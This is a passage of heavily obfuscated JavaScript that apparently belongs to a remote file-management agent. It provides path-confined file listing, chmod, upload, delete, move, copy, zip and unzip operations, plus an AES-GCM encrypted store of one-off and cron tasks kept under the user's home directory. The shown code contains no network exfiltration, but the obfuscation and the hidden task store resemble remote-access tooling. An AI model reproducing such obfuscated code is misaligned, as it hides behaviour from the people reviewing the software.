                    return h(i);
                },
                'ISBPa': function (h, i) {
                    return h(i);
                }
            }, d = a0o[c8(0x409)](a0P[c8(0x13c)], c[c8(0x3bf)](a, '.'));
        if (!c[c8(0x389)](a0W, d))
            throw new Error(c8(0x612));
        if (!a0l['existsSync'](d))
            throw new Error(c8(0x552));
        const f = [], g = h => {
                const c9 = c8, i = a0l[c9(0x168)](h);
                for (const j of i) {
                    const k = a0o[c9(0x344)](h, j), l = a0l[c9(0x195)](k), m = new a0L();
                    m[c9(0x3e3)] = j, m['path'] = a0o[c9(0x1dc)](a0P[c9(0x13c)], k), m[c9(0x40e)] = l[c9(0x881)]() ? c[c9(0x311)] : c[c9(0x46e)], m['size'] = l['size'], m['mtime'] = l[c9(0x507)]['toISOString'](), m['mode'] = this['_formatMode'](l['mode'], l['isDirectory']()), m[c9(0x2c8)] = '0o' + c[c9(0x204)](l[c9(0x6f7)], 0x1ff)['toString'](0x8), m[c9(0x6de)] = l[c9(0x3cf)] + ':' + l[c9(0x6ab)], f[c9(0x4a7)](m), b && l[c9(0x881)]() && g(k);
                }
            };
        return c['ISBPa'](g, d), f;
    }
    static async [a0aX(0x425)](a) {
        const ca = a0aX, b = {
                'RWOaW': function (d, f) {
                    return d(f);
                },
                'TnZXc': ca(0x3e4),
                'pEkrF': ca(0x2bc)
            }, c = [];
        for (const d of a) {
            const f = a0o[ca(0x409)](a0P[ca(0x13c)], d);
            if (!b['RWOaW'](a0W, f))
                continue;
            try {
                const g = a0l['statSync'](f), h = this[ca(0x793)](f, a0l[ca(0x586)][ca(0x5e4)]), i = this[ca(0x793)](f, a0l[ca(0x586)][ca(0x4b7)]), j = this['_checkAccess'](f, a0l[ca(0x586)]['X_OK']), k = new a0M();
                k[ca(0x785)] = a0o[ca(0x1dc)](a0P[ca(0x13c)], f), k[ca(0x3e3)] = a0o['basename'](f), k[ca(0x6f7)] = this[ca(0x446)](g[ca(0x6f7)], g[ca(0x881)]()), k[ca(0x2c8)] = '0o' + (g[ca(0x6f7)] & 0x1ff)['toString'](0x8), k[ca(0x40e)] = g[ca(0x881)]() ? b[ca(0x280)] : b[ca(0x48c)], k[ca(0x56c)] = h, k['writable'] = i, k['executable'] = j, c['push'](k);
            } catch (l) {
            }
        }
        return c;
    }
    static ['_checkAccess'](a, b) {
        const cb = a0aX;
        try {
            return a0l[cb(0x3de)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0aX(0x666)](a) {
        const cc = a0aX, b = {
                'RYOBt': function (c, d) {
                    return c === d;
                },
                'eOxrM': function (c, d) {
                    return c === d;
                },
                'aaWjw': cc(0x628),
                'pLeJH': function (c, d, f) {
                    return c(d, f);
                }
            };
        if (b[cc(0x4e8)](typeof a, cc(0x88a)))
            return a;
        if (b['eOxrM'](typeof a, b[cc(0x845)])) {
            const c = a[cc(0x1c8)]();
            if (/^[0-7]{3,4}$/[cc(0x328)](c))
                return b['pLeJH'](parseInt, c, 0x8);
        }
        throw new Error(cc(0x35b));
    }
    static [a0aX(0x446)](a, b) {
        const cd = a0aX, c = b ? 'd' : '-', d = [
                'r',
                'w',
                'x'
            ], f = (a & 0x1ff)[cd(0x562)](0x8)[cd(0x287)](0x3, '0');
        let g = c;
        for (const h of f) {
            const i = parseInt(h, 0xa);
            g += d[cd(0x747)]((j, k) => i & 0x4 >> k ? j : '-')[cd(0x344)]('');
        }
        return g;
    }
    static async [a0aX(0x307)](a, b = ![]) {
        const ce = a0aX, c = {
                'sxaTz': function (g, h) {
                    return g(h);
                },
                'JgOmR': function (g, h) {
                    return g(h);
                },
                'hgYoQ': function (g, h) {
                    return g(h);
                },
                'erggB': function (g, h) {
                    return g(h);
                },
                'GEZiD': ce(0x2ca)
            }, d = [];
        for (const [g, h] of Object[ce(0x3f7)](a)) {
            const i = a0o[ce(0x409)](a0P[ce(0x13c)], g);
            if (!c['hgYoQ'](a0W, i)) {
                d[ce(0x4a7)]({
                    'path': g,
                    'requested': c['JgOmR'](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': ce(0x34c)
                });
                continue;
            }
            try {
                const j = this[ce(0x666)](h), k = m => {
                        const cf = ce;
                        a0l[cf(0x1f9)](m, j);
                    };
                if (b && a0l['existsSync'](i) && a0l[ce(0x195)](i)[ce(0x881)]()) {
                    const m = n => {
                        const cg = ce;
                        c[cg(0x1ec)](k, n);
                        const o = a0l['readdirSync'](n);
                        for (const p of o) {
                            const q = a0o[cg(0x344)](n, p);
                            a0l[cg(0x195)](q)[cg(0x881)]() ? c[cg(0x3e5)](m, q) : k(q);
                        }
                    };
                    c[ce(0x5c3)](m, i);
                } else
                    c[ce(0x1ec)](k, i);
                const l = j[ce(0x562)](0x8);
                d[ce(0x4a7)]({
                    'path': g,
                    'requested': c[ce(0x5c3)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d['push']({
                    'path': g,
                    'requested': c[ce(0x654)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[ce(0x667)],
                    'message': n[ce(0x56d)]
                });
            }
        }
        const f = d[ce(0x597)](o => o[ce(0x126)] === 'ok')[ce(0x38d)];
        return {
            'status': 'ok',
            'total': d['length'],
            'success': f,
            'results': d
        };
    }
    static async [a0aX(0x3d3)](a) {
        const ch = a0aX, b = {
                'xnHoZ': function (h, i) {
                    return h(i);
                },
                'wXmGw': function (h, i) {
                    return h > i;
                },
                'cEgfu': function (h, i) {
                    return h * i;
                },
                'pZiAW': ch(0x882),
                'qsOcW': ch(0x66b),
                'icUXI': ch(0x71a),
                'sqBKB': ch(0x5ef)
            }, c = a0o['resolve'](a0P[ch(0x13c)], a);
        if (!b[ch(0x1b6)](a0W, c))
            throw new Error('Access\x20denied:\x20path\x20outside\x20root');
        const d = a0l['statSync'](c);
        if (b[ch(0x21d)](d['size'], b[ch(0x2f1)](0x400, 0x400)))
            throw new Error(b[ch(0x79a)]);
        const f = a0l[ch(0x518)](c), g = this[ch(0x7ef)](f);
        return {
            'status': 'ok',
            'path': a0o['relative'](a0P[ch(0x13c)], c),
            'content': g ? a0w[ch(0x7e0)](f) : f[ch(0x562)](b[ch(0x5d3)]),
            'encoding': g ? b[ch(0x714)] : b[ch(0x7d1)],
            'is_binary': g,
            'size': d['size']
        };
    }
    static ['_isBinary'](a) {
        const ci = a0aX, b = {
                'ljJRZ': function (c, d) {
                    return c === d;
                }
            };
        if (!a || b[ci(0x43b)](a[ci(0x38d)], 0x0))
            return ![];
        for (let c = 0x0; c < Math['min'](a[ci(0x38d)], 0x200); c++) {
            if (b['ljJRZ'](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0aX(0x45e)](a, b, c, d = null, f = null) {
        const cj = a0aX, g = {
                'BKEcX': function (l, m) {
                    return l(m);
                },
                'vholb': cj(0x612),
                'OhKEj': function (l, m) {
                    return l > m;
                },
                'wSUig': function (l, m) {
                    return l !== m;
                },
                'YGBnC': function (l, m) {
                    return l(m);
                },
                'itzWf': cj(0x3e9),
                'ggatN': cj(0x1ac),
                'nSrgE': function (l, m) {
                    return l === m;
                },
                'HgBSA': function (l, m) {
                    return l < m;
                }
            }, h = a0o['resolve'](a0P[cj(0x13c)], a);
        let j = h;
        b && (j = a0o['join'](h, b));
        if (!g[cj(0x897)](a0W, j))
            throw new Error(g[cj(0x5af)]);
        !a0l[cj(0x83e)](a0o[cj(0x664)](j)) && a0l[cj(0x568)](a0o[cj(0x664)](j), { 'recursive': !![] });
        const k = a0w['toByteArray'](c);
        if (g[cj(0x670)](k[cj(0x38d)], a0P[cj(0x647)]))
            throw new Error(cj(0x882));
        if (g[cj(0x3c9)](d, null) && f !== null) {
            const l = g['BKEcX'](Number, d), m = g[cj(0x122)](Number, f);
            if (Number[cj(0x7a7)](l) || Number['isNaN'](m))
                throw new Error(g[cj(0x7dc)]);
            const n = a0o[cj(0x344)](a0o[cj(0x664)](j), g[cj(0x457)], a0o[cj(0x347)](j));
            !a0l['existsSync'](n) && a0l['mkdirSync'](n, { 'recursive': !![] });
            const o = a0o[cj(0x344)](n, cj(0x745) + l);
            a0l[cj(0x78f)](o, k);
            const p = a0l['readdirSync'](n)[cj(0x597)](s => s[cj(0x1f5)](cj(0x745))), q = p[cj(0x38d)], r = g['nSrgE'](q, m);
            if (r) {
                const s = a0l['createWriteStream'](j);
                for (let u = 0x0; g[cj(0x1b4)](u, m); u++) {
                    const v = a0o[cj(0x344)](n, cj(0x745) + u);
                    if (!a0l[cj(0x83e)](v)) {
                        s[cj(0x5a2)]();
                        throw new Error('Missing\x20chunk\x20' + u);
                    }
                    s[cj(0x462)](a0l['readFileSync'](v));
                }
                s[cj(0x712)]();
                const t = a0o[cj(0x664)](n);
                a0l['rmSync'](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[cj(0x125)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o[cj(0x1dc)](a0P[cj(0x13c)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[cj(0x78f)](j, k), {
            'status': 'ok',
            'path': a0o[cj(0x1dc)](a0P[cj(0x13c)], j),
            'received': k[cj(0x38d)],
            'total': k[cj(0x38d)],
            'chunked': ![]
        };
    }
    static async ['uploadFileRaw'](a, b, c, d = null, f = null) {
        const ck = a0aX, g = {
                'jSxDg': function (k, l) {
                    return k || l;
                },
                'pPyDb': function (k, l) {
                    return k(l);
                },
                'Zhsdu': 'Access\x20denied:\x20path\x20outside\x20root',
                'Vaoay': 'File\x20too\x20large',
                'XGZer': function (k, l) {
                    return k !== l;
                },
                'qKSLp': function (k, l) {
                    return k !== l;
                },
                'UUNrF': function (k, l) {
                    return k(l);
                },
                'cpQiu': function (k, l) {
                    return k(l);
                },
                'VgoTI': ck(0x1ac),
                'mFiqS': function (k, l) {
                    return k === l;
                },
                'CUuUl': ck(0x40b),
                'FjDUi': ck(0x5ca)
            }, h = a0o[ck(0x409)](a0P[ck(0x13c)], g[ck(0x2cd)](a, '.'));
        let j = h;
        b && (j = a0o['join'](h, b));
        if (!g[ck(0x53e)](a0W, j))
            throw new Error(g[ck(0x60c)]);
        !a0l[ck(0x83e)](a0o[ck(0x664)](j)) && a0l[ck(0x568)](a0o[ck(0x664)](j), { 'recursive': !![] });
        if (c[ck(0x38d)] > a0P['MAX_UPLOAD_SIZE'])
            throw new Error(g['Vaoay']);
        if (g['XGZer'](d, null) && g['qKSLp'](f, null)) {
            const k = g[ck(0x74c)](Number, d), l = g['cpQiu'](Number, f);
            if (Number['isNaN'](k) || Number['isNaN'](l))
                throw new Error('chunk_id\x20and\x20total_chunks\x20must\x20be\x20numeric');
            const m = a0o[ck(0x344)](a0o[ck(0x664)](j), g[ck(0x7a6)], a0o[ck(0x347)](j));
            !a0l[ck(0x83e)](m) && a0l['mkdirSync'](m, { 'recursive': !![] });
            const n = a0o[ck(0x344)](m, 'chunk_' + k);
            a0l[ck(0x78f)](n, c);
            const o = a0l[ck(0x168)](m)[ck(0x597)](r => r[ck(0x1f5)](ck(0x745))), p = o[ck(0x38d)], q = g[ck(0x387)](p, l);
            if (q) {
                const r = [];
                for (let t = 0x0; t < l; t++) {
                    const u = a0o[ck(0x344)](m, ck(0x745) + t);
                    if (!a0l[ck(0x83e)](u))
                        throw new Error(ck(0x5e1) + t);
                    r[ck(0x4a7)](a0l['readFileSync'](u));
                }
                a0l[ck(0x78f)](j, Buffer['concat'](r));
                const s = a0o[ck(0x664)](m);
                a0l['rmSync'](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l['rmdirSync'](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o['relative'](a0P[ck(0x13c)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g['CUuUl']
                };
            }
            return {
                'status': 'ok',
                'path': a0o[ck(0x1dc)](a0P['FILE_ROOT'], j),
                'chunk_id': k,
                'completed': ![],
                'message': ck(0x57b) + k + ck(0x89a)
            };
        }
        return a0l[ck(0x78f)](j, c), {
            'status': 'ok',
            'path': a0o[ck(0x1dc)](a0P[ck(0x13c)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[ck(0x2b7)]
        };
    }
    static async [a0aX(0x4fa)](a) {
        const cl = a0aX, b = {
                'NyiFS': function (g, h) {
                    return g(h);
                },
                'tyjgU': cl(0x612),
                'iMAOK': cl(0x4dc)
            }, c = a0o[cl(0x409)](a0P[cl(0x13c)], a);
        if (!b['NyiFS'](a0W, c))
            throw new Error(b[cl(0x4bc)]);
        if (!a0l[cl(0x83e)](c))
            throw new Error(b[cl(0x3f3)]);
        const d = a0l[cl(0x195)](c), f = await a0l[cl(0x18b)][cl(0x3d3)](c);
        return {
            'path': a0o[cl(0x1dc)](a0P[cl(0x13c)], c),
            'content': f,
            'size': d[cl(0x221)]
        };
    }
    static async ['deleteFiles'](a) {
        const cm = a0aX, b = {
                'iRxJf': function (d, f) {
                    return d(f);
                },
                'nXIhG': 'access_denied',
                'qnfKy': cm(0x80c),
                'PZQTb': cm(0x2ca)
            }, c = [];
        for (const d of a) {
            const f = a0o[cm(0x409)](a0P['FILE_ROOT'], d);
            if (!b['iRxJf'](a0W, f)) {
                c[cm(0x4a7)]({
                    'path': d,
                    'status': b[cm(0x656)]
                });
                continue;
            }
            try {
                if (a0l[cm(0x83e)](f)) {
                    const g = a0l[cm(0x195)](f);
                    g['isDirectory']() ? a0l[cm(0x203)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l['unlinkSync'](f), c['push']({
                        'path': d,
                        'status': cm(0x67b)
                    });
                } else
                    c[cm(0x4a7)]({
                        'path': d,
                        'status': b[cm(0x588)]
                    });
            } catch (h) {
                c[cm(0x4a7)]({
                    'path': d,
                    'status': b[cm(0x355)],
                    'message': h[cm(0x56d)]
                });
            }
        }
        return c;
    }
    static async ['moveFiles'](a) {
        const cn = a0aX, b = {
                'AlyyR': function (d, f) {
                    return d(f);
                },
                'uQjQv': cn(0x2ca)
            }, c = [];
        for (const [d, f] of Object[cn(0x3f7)](a)) {
            const g = a0o['resolve'](a0P[cn(0x13c)], d), h = a0o[cn(0x409)](a0P['FILE_ROOT'], f);
            if (!b['AlyyR'](a0W, g) || !b[cn(0x2d1)](a0W, h)) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': cn(0x34c)
                });
                continue;
            }
            try {
                const i = a0o[cn(0x664)](h);
                !a0l['existsSync'](i) && a0l['mkdirSync'](i, { 'recursive': !![] }), a0l[cn(0x2d8)](g, h), c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[cn(0x4a7)]({
                    'from': d,
                    'to': f,
                    'status': b[cn(0x1f8)],
                    'message': j['message']
                });
            }
        }
        return c;
    }
    static async [a0aX(0x35e)](a) {
        const co = a0aX, b = {
                'rhZKS': function (d, f, g) {
                    return d(f, g);
                },
                'UnIyk': function (d, f) {
                    return d(f);
                },
                'dKTaf': co(0x34c),
                'hLLIa': co(0x80c),
                'cOaij': function (d, f, g) {
                    return d(f, g);
                },
                'JHMvf': 'error'
            }, c = [];
        for (const [d, f] of Object[co(0x3f7)](a)) {
            const g = a0o['resolve'](a0P['FILE_ROOT'], d), h = a0o[co(0x409)](a0P[co(0x13c)], f);
            if (!b[co(0x11d)](a0W, g) || !b[co(0x11d)](a0W, h)) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b[co(0x391)]
                });
                continue;
            }
            try {
                if (!a0l[co(0x83e)](g)) {
                    c[co(0x4a7)]({
                        'from': d,
                        'to': f,
                        'status': b['hLLIa']
                    });
                    continue;
                }
                const i = a0o[co(0x664)](h);
                !a0l[co(0x83e)](i) && a0l[co(0x568)](i, { 'recursive': !![] });
                const j = a0l['statSync'](g);
                if (j['isDirectory']()) {
                    if (a0l['cpSync'])
                        a0l[co(0x81d)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const cp = co;
                            if (a0l[cp(0x195)](l)[cp(0x881)]()) {
                                if (!a0l[cp(0x83e)](m))
                                    a0l[cp(0x568)](m, { 'recursive': !![] });
                                for (const n of a0l['readdirSync'](l)) {
                                    b[cp(0x87b)](k, a0o[cp(0x344)](l, n), a0o[cp(0x344)](m, n));
                                }
                            } else
                                a0l['copyFileSync'](l, m);
                        };
                        b[co(0x838)](k, g, h);
                    }
                } else
                    a0l[co(0x30f)](g, h);
                c[co(0x4a7)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[co(0x4a7)]({
                    'from': d,
                    'to': f,
                    'status': b[co(0x24a)],
                    'message': l[co(0x56d)]
                });
            }
        }
        return c;
    }
    static async [a0aX(0x1fe)](a) {
        const cq = a0aX, b = {
                'OAIBY': function (d, f) {
                    return d(f);
                },
                'wMsYc': 'Access\x20denied:\x20path\x20outside\x20root'
            }, c = a0o[cq(0x409)](a0P[cq(0x13c)], a);
        if (!b[cq(0x25a)](a0W, c))
            throw new Error(b[cq(0x5e0)]);
        return a0l[cq(0x568)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o[cq(0x1dc)](a0P['FILE_ROOT'], c)
        };
    }
    static [a0aX(0x80a)](a) {
        return a0o['relative'](a0P['FILE_ROOT'], a) || '.';
    }
    static async [a0aX(0x505)](a, b, c = ![]) {
        const cr = a0aX, d = {
                'MGKhM': function (k, l, m) {
                    return k(l, m);
                },
                'nrNax': 'path\x20required',
                'izOrC': function (k, l) {
                    return k === l;
                },
                'egjAt': cr(0x7d4),
                'xutFE': cr(0x612),
                'rpfDZ': function (k, l) {
                    return k || l;
                },
                'iEjhu': function (k, l) {
                    return k(l);
                },
                'jYIXp': cr(0x2ca),
                'YhhcP': cr(0x80c),
                'xqVDI': cr(0x164),
                'KKWHE': cr(0x634)
            };
        if (!a)
            throw new Error(d['nrNax']);
        if (!Array[cr(0x7cd)](b) || d['izOrC'](b[cr(0x38d)], 0x0))
            throw new Error(d['egjAt']);
        const f = a0o['resolve'](a0P[cr(0x13c)], a);
        if (!a0W(f))
            throw new Error(d[cr(0x297)]);
        if (a0l[cr(0x83e)](f) && a0l[cr(0x195)](f)[cr(0x881)]())
            throw new Error('Target\x20is\x20a\x20directory:\x20' + a);
        a0l[cr(0x568)](a0o[cr(0x664)](f), { 'recursive': !![] });
        if (a0l[cr(0x83e)](f))
            a0l[cr(0x7c1)](f);
        const g = a0X['openWriter'](f), h = [];
        let i = 0x0, j = ![];
        for (const k of b) {
            if (j) {
                h['push']({
                    'item': k,
                    'status': cr(0x164),
                    'added': 0x0
                });
                continue;
            }
            const l = a0o[cr(0x409)](a0P[cr(0x13c)], d[cr(0x336)](k, ''));
            try {
                if (!d['iEjhu'](a0W, l)) {
                    h['push']({
                        'item': k,
                        'status': d[cr(0x6d1)],
                        'added': 0x0
                    });
                    continue;
                }
                if (!a0l['existsSync'](l)) {
                    h['push']({
                        'item': k,
                        'status': d['YhhcP'],
                        'added': 0x0
                    });
                    continue;
                }
                const m = a0l[cr(0x195)](l);
                let n = 0x0, o = ![];
                if (m['isFile']()) {
                    if (!g[cr(0x6c8)](a0o[cr(0x347)](l), a0l[cr(0x518)](l), m[cr(0x507)])) {
                        j = !![], h[cr(0x4a7)]({
                            'item': k,
                            'status': d['xqVDI'],
                            'added': 0x0
                        });
                        continue;
                    }
                    n = 0x1;
                } else {
                    if (m['isDirectory']()) {
                        const p = a0o['basename'](l), q = (r, s) => {
                                const cs = cr;
                                for (const t of a0l['readdirSync'](r)) {
                                    const u = a0o[cs(0x344)](r, t), v = s ? s + '/' + t : t, w = a0l[cs(0x195)](u);
                                    if (w[cs(0x881)]()) {
                                        if (!g[cs(0x6c8)](v + '/', Buffer[cs(0x252)](0x0), w[cs(0x507)], !![])) {
                                            o = !![];
                                            return;
                                        }
                                        d[cs(0x7dd)](q, u, v);
                                        if (o)
                                            return;
                                    } else {
                                        if (w[cs(0x2db)]()) {
                                            if (!g[cs(0x6c8)](v, a0l[cs(0x518)](u), w[cs(0x507)])) {
                                                o = !![];
                                                return;
                                            }
                                            n++;
                                        }
                                    }
                                }
                            };
                        d[cr(0x7dd)](q, l, c ? '' : p);
                    } else {
                        h[cr(0x4a7)]({
                            'item': k,
                            'status': d[cr(0x6d1)],
                            'added': 0x0
                        });
                        continue;
                    }
                }
                if (o) {
                    j = !![], i += n, h[cr(0x4a7)]({
                        'item': k,
                        'status': d['KKWHE'],
                        'added': n
                    });
                    continue;
                }
                i += n, h[cr(0x4a7)]({
                    'item': k,
                    'status': 'ok',
                    'added': n
                });
            } catch (r) {
                h[cr(0x4a7)]({
                    'item': k,
                    'status': d['jYIXp'],
                    'added': 0x0
                });
            }
        }
        return g[cr(0x5a2)](), {
            'status': 'ok',
            'path': a0Y[cr(0x80a)](f),
            'entries': i,
            'size': a0l[cr(0x83e)](f) ? a0l[cr(0x195)](f)[cr(0x221)] : 0x0,
            'results': h
        };
    }
    static async [a0aX(0x35a)](a, b, c = !![], d = null) {
        const ct = a0aX, f = {
                'Xsmir': function (p, q) {
                    return p(q);
                },
                'qmghD': ct(0x612),
                'bdxcx': function (p, q) {
                    return p + q;
                },
                'GdIjN': function (p, q) {
                    return p > q;
                },
                'XfTlO': function (p, q) {
                    return p + q;
                },
                'FXRMm': function (p, q) {
                    return p !== q;
                },
                'bRIet': function (p, q) {
                    return p < q;
                }
            };
        if (!a)
            throw new Error('path\x20required');
        const g = a0o[ct(0x409)](a0P[ct(0x13c)], a);
        if (!f[ct(0x248)](a0W, g))
            throw new Error(f[ct(0x4fe)]);
        if (!a0l[ct(0x83e)](g))
            throw new Error(ct(0x1aa) + a);
        if (a0l[ct(0x195)](g)[ct(0x881)]())
            throw new Error(ct(0x12a) + a);
        let h;
        if (b) {
            h = a0o[ct(0x409)](a0P['FILE_ROOT'], b);
            if (!f[ct(0x248)](a0W, h))
                throw new Error(f[ct(0x4fe)]);
            if (a0l[ct(0x83e)](h) && !a0l['statSync'](h)['isDirectory']())
                throw new Error(ct(0x3dd) + b);
        } else
            h = a0o['dirname'](g);
        a0l[ct(0x568)](h, { 'recursive': !![] });
        let i;
        try {
            i = a0X['parse'](g);
        } catch (p) {
            throw new Error(ct(0x7d8) + a);
        }
        const j = (d || [])[ct(0x597)](q => q);
        let k = 0x0, l = 0x0, m = 0x0;
        const n = [];
        let o = ![];
        for (const q of i) {
            if (q[ct(0x504)])
                continue;
            if (f[ct(0x5b6)](k, l) >= a0X[ct(0x806)] || m >= a0X[ct(0x57f)]) {
                l++;
                continue;
            }
            const r = q['name']['replace'](/\\/g, '/');
            if (j[ct(0x38d)]) {
                const v = r['split']('/')[ct(0x321)]();
                if (!j[ct(0x1be)](r) && !j[ct(0x1be)](v)) {
                    l++;
                    continue;
                }
            }
            if (q[ct(0x6e5)] || q[ct(0x217)] || f['GdIjN'](f['XfTlO'](m, q[ct(0x221)]), a0X[ct(0x57f)])) {
                l++;
                continue;
            }
            const s = a0o[ct(0x409)](h, r), t = a0o['relative'](h, s);
            if (t[ct(0x1f5)]('..') || a0o[ct(0x29e)](t)) {
                l++;
                continue;
            }
            if (!f[ct(0x248)](a0W, s)) {
                l++;
                continue;
            }
            let u;
            try {
                u = a0X['inflate'](q);
            } catch (w) {
                l++;
                continue;
            }
            if (f['FXRMm'](a0X['_crc32'](u), q[ct(0x187)])) {
                l++;
                continue;
            }
            if (!c && a0l['existsSync'](s)) {
                l++;
                continue;
            }
            try {
                a0l[ct(0x568)](a0o[ct(0x664)](s), { 'recursive': !![] }), a0l[ct(0x78f)](s, u);
            } catch (x) {
                l++;
                continue;
            }
            k++, m += q[ct(0x221)], f['bRIet'](n[ct(0x38d)], a0X[ct(0x486)]) ? n[ct(0x4a7)](a0Y[ct(0x80a)](s)) : o = !![];
        }
        return {
            'status': 'ok',
            'path': a0Y[ct(0x80a)](g),
            'dest': a0Y['_displayPath'](h),
            'extracted': k,
            'skipped': l,
            'files': n,
            'files_truncated': o
        };
    }
}
class a0Z {
    static [a0aX(0x570)] = a0aX(0x3c7);
    static [a0aX(0x23a)] = 0x1;
    static [a0aX(0x602)] = {
        'enabled': ![],
        'locked': ![],
        'path': null,
        'key': null,
        'lastSavedAt': null
    };
    static [a0aX(0x6c7)]() {
        const cu = a0aX;
        for (const a of [
                process.env.USERPROFILE,
                process.env.HOME
            ]) {
            if (a && a0l[cu(0x83e)](a))
                return a;
        }
        try {
            return a0p[cu(0x762)]() || process[cu(0x60e)]();
        } catch (b) {
            return process['cwd']();
        }
    }
    static ['parseKey'](a) {
        const cv = a0aX, b = {
                'KKhLN': 'hex',
                'DYHDI': function (c, d) {
                    return c === d;
                },
                'EDkTn': cv(0x71a)
            };
        if (!a)
            return null;
        try {
            if (/^[0-9a-fA-F]{64}$/[cv(0x328)](a)) {
                const d = Buffer[cv(0x3a5)](a, b[cv(0x850)]);
                return b[cv(0x68e)](d[cv(0x38d)], 0x20) ? d : null;
            }
            if (!/^[A-Za-z0-9+/]+={0,2}$/['test'](a))
                return null;
            const c = Buffer[cv(0x3a5)](a, b[cv(0x4f2)]);
            return b[cv(0x68e)](c[cv(0x38d)], 0x20) ? c : null;
        } catch (f) {
            return null;
        }
    }
    static [a0aX(0x692)]() {
        const cw = a0aX, a = {
                'YcbrB': 'none',
                'loLxR': cw(0x5cc),
                'Qvewb': '.tmp',
                'DfFPJ': cw(0x7a0)
            }, b = a0Z['state'];
        let c = (process.env.KSTORE || '')[cw(0x1c8)]();
        if ([
                cw(0x1eb),
                '0',
                a[cw(0x563)],
                a[cw(0x1d1)]
            ][cw(0x1be)](c['toLowerCase']()))
            return a0D['info'](cw(0x4ee)), b;
        const d = (process.env.KSTORE_KEY || '')[cw(0x1c8)]();
        !c && (c = a0o['join'](a0Z[cw(0x6c7)](), a[cw(0x1ee)], 'store.enc'));
        const f = a0Z[cw(0x467)](d);
        if (!f) {
            if (d)
                a0D[cw(0x2ca)](a[cw(0x842)]);
            else
                a0D[cw(0x604)](cw(0x6e4));
            return b;
        }
        return b[cw(0x785)] = c, b[cw(0x417)] = f, b[cw(0x3d5)] = !![], a0D[cw(0x604)](cw(0x4da) + b[cw(0x785)]), b;
    }
    static [a0aX(0x3f4)](a, b) {
        const cx = a0aX, c = {
                'rBirh': cx(0x71a),
                'FQSjn': cx(0x66b)
            }, d = a0k['randomBytes'](0xc), f = a0k['createCipheriv']('aes-256-gcm', a, d), g = Buffer[cx(0x83f)]([
                f[cx(0x522)](Buffer[cx(0x3a5)](b, cx(0x66b))),
                f[cx(0x30c)]()
            ]), h = {
                'nonce': d['toString'](c[cx(0x2cc)]),
                'tag': f[cx(0x37d)]()[cx(0x562)](c[cx(0x2cc)]),
                'ciphertext': g[cx(0x562)](cx(0x71a))
            };
        return Buffer[cx(0x3a5)](JSON[cx(0x7cb)](h), c[cx(0x4d9)])[cx(0x562)](cx(0x71a));
    }
    static [a0aX(0x257)](a, b) {
        const cy = a0aX, c = {
                'QuZDK': cy(0x1db),
                'SeCMd': cy(0x71a),
                'dqJjv': cy(0x66b)
            }, d = JSON['parse'](Buffer[cy(0x3a5)](b, cy(0x71a))[cy(0x562)](cy(0x66b)));
        if (!d[cy(0x15f)] || !d['tag'] || !d[cy(0x15a)])
            throw new Error(c[cy(0x2aa)]);
        const f = a0k['createDecipheriv'](cy(0x135), a, Buffer[cy(0x3a5)](d['nonce'], c['SeCMd']));
        return f[cy(0x64b)](Buffer[cy(0x3a5)](d[cy(0x741)], c[cy(0x5c0)])), Buffer[cy(0x83f)]([
            f['update'](Buffer[cy(0x3a5)](d[cy(0x15a)], c[cy(0x5c0)])),
            f['final']()
        ])[cy(0x562)](c[cy(0x3b2)]);
    }
    static [a0aX(0x86e)]() {
        const cz = a0aX, a = {
                'NiDgU': cz(0x66b),
                'FkWol': cz(0x24e),
                'dRjHy': function (c, d, f) {
                    return c(d, f);
                },
                'HTLMf': function (c, d) {
                    return c > d;
                },
                'GMFZM': function (c, d) {
                    return c !== d;
                },
                'RwBcT': function (c, d) {
                    return c(d);
                },
                'qEpnu': function (c, d) {
                    return c(d);
                }
            }, b = a0Z[cz(0x602)];
        if (!b[cz(0x3d5)])
            return {
                'onetasks': [],
                'crontasks': {}
            };
        try {
            if (!a0l[cz(0x83e)](b[cz(0x785)]))
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            const c = a0l['readFileSync'](b[cz(0x785)], a['NiDgU'])[cz(0x1c8)]();
            if (!c)
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            let d;
            try {
                d = JSON[cz(0x1ef)](a0Z[cz(0x257)](b['key'], c));
            } catch (j) {
                throw new Error(cz(0x857) + j[cz(0x56d)]);
            }
            if (!d || d[cz(0x731)] !== a0Z[cz(0x570)])
                throw new Error(a['FkWol']);
            const f = a[cz(0x213)](parseInt, d[cz(0x113)], 0xa) || 0x0;
            if (a[cz(0x830)](f, a0Z[cz(0x23a)]))
                return b[cz(0x4c2)] = !![], a0D[cz(0x2ca)](cz(0x4cf) + f + cz(0x41a) + a0Z['VERSION'] + cz(0x3fe)), {
                    'onetasks': [],
                    'crontasks': {}
                };
            if (a['GMFZM'](f, a0Z[cz(0x23a)]))
                throw new Error(cz(0x6a6) + f);
            const g = d[cz(0x138)] || {};
            b['lastSavedAt'] = d[cz(0x2f7)] || null;
            const h = Array[cz(0x7cd)](g[cz(0x139)]) ? g[cz(0x139)][cz(0x747)](String) : [], i = {};
            for (const [l, m] of Object[cz(0x3f7)](g['crontasks'] || {}))
                i[a[cz(0x53a)](String, l)] = a[cz(0x381)](String, m);
            return a0D[cz(0x604)](cz(0x6db) + h[cz(0x38d)] + ',\x20cron=' + Object[cz(0x524)](i)[cz(0x38d)]), {
                'onetasks': h,
                'crontasks': i
            };
